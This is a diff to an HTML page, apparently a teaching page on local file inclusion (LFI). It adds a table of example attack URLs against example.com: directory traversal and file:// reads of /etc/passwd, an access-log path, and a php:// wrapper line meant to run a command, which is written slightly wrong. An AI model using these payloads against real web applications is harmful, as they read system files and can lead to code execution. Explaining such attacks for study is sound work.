@@ -19,6 +19,32 @@
                     <h4>Below are some examples of LFI usage</h4>
                 </section>
             </center>
+            <center><table border="1"> <!-- creates a table on the document(columns and rows) -->
+                <thead>
+                    <tr>
+                        <th>Wrapper</th>
+                        <th>Example Usage</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>php://</td>
+                        <td>https://example.com/page=php://expect=ls</td>
+                    </tr>
+                    <tr>
+                        <td>file://</td>
+                        <td>https://example.com/page=file:///etc/passwd</td>
+                    </tr>
+                    <tr>
+                        <td>No Wrapper</td>
+                        <td>https://example.com/page=../../../etc/passwd</td>
+                    </tr>
+                    <tr>
+                        <td>No Wrapper</td>
+                        <td>https://example.com/page=/var/log/access.log</td>
+                    </tr>
+                </tbody>
+            </table></center>
         </main> <!-- This is used for the main content on the page, example, products being sold -->
     </body>
 </html>
